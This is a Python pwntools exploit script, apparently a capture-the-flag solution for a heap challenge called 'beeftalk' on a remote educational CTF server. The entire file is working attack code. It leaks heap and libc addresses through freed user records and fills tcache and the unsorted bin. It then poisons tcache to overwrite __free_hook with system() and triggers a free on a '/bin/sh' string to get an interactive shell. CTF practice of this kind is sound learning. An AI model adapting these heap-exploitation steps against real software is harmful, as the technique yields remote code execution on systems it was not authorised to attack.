from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.binary = './beeftalk'
# context.log_level = 'debug'

# p = process("./beeftalk")
p = remote("edu-ctf.zoolab.org", 30207)

def signup(name, desc, job, assets):
    p.sendlineafter("3. leave\n> ", "2")
    p.sendlineafter("What's your name ?\n> ", name)
    p.sendlineafter("What's your desc ?\n> ", desc)
    p.sendlineafter("What's your job ?\n> ", job)
    p.sendlineafter("How much money do you have ?\n> ", assets)
    p.sendlineafter("Is correct ?\n(y/n) > ", "y")
    token = p.recvline(keepends=False).split()[-1]
    return token

def login(token):
    p.sendlineafter("3. leave\n> ", "1")
    p.sendlineafter("Give me your token: \n> ", token)
    p.recvuntil("Login successfully !")

def logout():
    p.sendlineafter("4. logout\n> ", "4")

def delete_account():
    p.sendlineafter("4. logout\n> ", "3")
    p.sendlineafter("Are you sure ?\n(y/n) > ", "y")
    p.recvuntil("Delete successfully !")

def update_user(name, desc, job, assets):
    p.sendlineafter("4. logout\n> ", "1")
    p.sendlineafter("Name: \n> ", name)
    p.sendlineafter("Desc: \n> ", desc)
    p.sendlineafter("Job: \n> ", job)
    p.sendlineafter("Money: \n> ", assets)
    p.recvuntil("Update successfully !")
    


user0 = signup(b"A"*7, "123", "123", "123")
login(user0)
delete_account()

user0 = signup(b"", "123", "123", "123")
login(user0)

p.recvuntil("Hello \n")
heap_base = int(p.recvline().split(b", have a nice day !\n")[0][::-1].hex()[0:-1]+'000', base=16)

delete_account()
print(hex(heap_base))

# leak glibc address

## fill tcache

users = ['']*8
for i in range(7):
    users[i] = signup(b"A"*0x80, "123", "123", "123")

for i in range(7):
    login(users[i])
    delete_account()

## fill unsortbin
users[0] = signup(b"A"*0x80, "123", "123", "123")
login(users[0])
delete_account()

## flush tcache
for i in range(4):
    users[i] = signup(b"", "123", "123", "123")

users[4] = signup(b"", "123", "123", "123")
login(users[4])

p.recvuntil("Hello \n")
libc = int(p.recvline().split(b", have a nice day !\n")[0][::-1].hex()[0:-1]+'000', base=16) - 0x1eb000
_system = libc + 0x55410
__free_hook = libc + 0x1eeb28

print(hex(libc), hex(_system), hex(__free_hook))

# hijack

delete_account()

users[4] = signup(b"", "123", "123", "123")
users[5] = signup(b"A"*0x20, "123", "123", "123")
users[6] = signup(b"", "123", "123", "123")

login(users[6])
delete_account()

login(users[5])
delete_account()

login(users[3])
delete_account()

users[4] = signup(b"A"*0x20, "123", "123", "123")

# after this point, user4.desc = user5

login(users[4])
fake = p64(__free_hook-8) + p64(__free_hook)
update_user(b"", fake, b"", b"")
logout()

print(users[5], _system)

login(users[5])

update_user(b'/bin/sh\x00', p64(_system), b"", b"")


p.sendlineafter("4. logout\n> ", "3")
p.sendlineafter("Are you sure ?\n(y/n) > ", "y")

p.interactive()
